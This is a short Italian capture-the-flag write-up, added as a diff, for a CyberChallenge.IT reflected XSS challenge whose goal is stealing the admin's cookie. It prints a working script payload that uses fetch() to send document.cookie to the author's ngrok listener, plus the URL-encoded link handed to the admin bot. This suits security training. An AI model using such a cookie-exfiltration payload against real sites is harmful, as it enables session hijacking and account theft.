@@ -1,0 +1,16 @@
+Per risolvere questa challenge bisogna cercare il cookie dell'admin.
+Se notiamo, quando facciamo submit query, prende qualsiasi cosa, anche i tag
+html e javascript.
+Quindi se io scrivo <b>ciao</b>, lui mi stampa ciao in grassetto.
+Fatto questo, l'idea è mandare uno script in cui riusciamo a prendere il cookie
+mediante l'url di un mio server in ascolto, in questo caso ngrok.
+Quindi se io mando questo semplice comando:
+<script>fetch("https://unuseable-nada-noncaustically.ngrok-free.dev?=" + document.cookie)</script>
+lui non mi stampa nulla, ma il server ha ricevuto la richiesta fetch, quindi 
+l'ha eseguito.
+Ora una volta fatta la richiesta, posso fare report url che fa richiesta all'url che io gli mando,
+ovvero il seguente:
+http://xss1.challs.cyberchallenge.it/?html=%3Cscript%3Efetch%28%22https%3A%2F%2Funuseable-nada-noncaustically.ngrok-free.dev%3F%3D%22+%2B+document.cookie%29%3C%2Fscript%3E
+che l'ho ottenuto mandando il form submit query.
+Di conseguenza, il server avrà ricevuto il cookie e mi stampa la flag ricevuta.
+
